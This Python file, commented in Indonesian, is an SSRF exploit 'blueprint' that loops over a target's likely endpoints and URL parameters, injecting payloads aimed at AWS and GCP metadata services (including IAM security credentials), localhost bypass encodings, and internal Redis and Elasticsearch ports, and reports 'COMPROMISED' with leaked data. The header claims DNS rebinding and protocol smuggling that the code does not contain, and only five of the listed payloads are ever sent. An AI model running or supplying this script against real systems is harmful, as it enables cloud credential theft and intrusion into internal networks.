"""
Ouroboros Code Blueprint: SSRF (Server-Side Request Forgery)
=============================================================
Kategori : SSRF - Internal Network Pivot & Cloud Metadata Exfiltration
Tingkat  : Advanced
Teknik   : IPv6 bypass, DNS Rebinding, Redirect Abuse, Protocol Smuggling
"""

def run_exploit(target_url):
    """
    Blueprint SSRF untuk mengakses internal services atau cloud metadata.
    Sesuaikan `ssrf_param` dengan nama parameter SSRF yang ditemukan di target.
    """
    import requests
    import re

    session = requests.Session()
    session.max_redirects = 10

    # -------------------------------------------------------------------
    # Daftar payload SSRF dengan berbagai teknik bypass
    # -------------------------------------------------------------------
    payloads = [
        # AWS Metadata endpoints
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",

        # IPv6-mapped IPv4 bypass
        "http://[::ffff:169.254.169.254]/latest/meta-data/",
        "http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/",

        # GCP metadata endpoint
        "http://metadata.google.internal/computeMetadata/v1/",

        # Localhost variations
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://[::ffff:127.0.0.1]/",
        "http://0177.0.0.1/",           # Octal encoding
        "http://2130706433/",             # Decimal IP (127.0.0.1)

        # Internal common services
        "http://localhost:8080/",
        "http://localhost:6379/",         # Redis
        "http://localhost:9200/",         # Elasticsearch

        # URL parser confusion
        "http://evil.com@127.0.0.1/",
        "http://127.0.0.1.evil.com/",
    ]

    # Parameter yang mungkin rentan SSRF - sesuaikan dengan target
    ssrf_params = ["url", "uri", "path", "redirect", "next", "ref", "callback",
                   "webhook", "proxy", "fetch", "target", "src", "source", "endpoint"]

    ssrf_endpoints = [
        f"{target_url}/",
        f"{target_url}/fetch",
        f"{target_url}/proxy",
        f"{target_url}/redirect",
        f"{target_url}/preview",
    ]

    try:
        for endpoint in ssrf_endpoints:
            for param in ssrf_params:
                for payload in payloads[:5]:  # Test 5 payloads per kombinasi
                    try:
                        r = session.get(endpoint, params={param: payload},
                                       timeout=5, allow_redirects=True)

                        # Deteksi keberhasilan akses metadata AWS
                        if any(kw in r.text for kw in [
                            "ami-id", "instance-id", "security-credentials",
                            "iam/", "computeMetadata", "redis_version",
                            "cluster_name", "elasticsearch"
                        ]):
                            return {
                                "status": "COMPROMISED",
                                "details": f"SSRF berhasil! Endpoint: {endpoint}?{param}={payload}. Data: {r.text[:300]}"
                            }

                        # Deteksi respons internal (non-public content)
                        if r.status_code == 200 and len(r.text) > 50:
                            if any(kw in r.text.lower() for kw in ["internal", "admin", "debug", "localhost"]):
                                return {
                                    "status": "COMPROMISED",
                                    "details": f"SSRF mengakses resource internal! URL: {endpoint}?{param}={payload}"
                                }

                    except Exception:
                        continue

        return {"status": "FAILED", "details": "Tidak ada endpoint atau parameter SSRF yang rentan ditemukan."}

    except Exception as e:
        return {"status": "FAILED", "details": f"Exception: {str(e)}"}
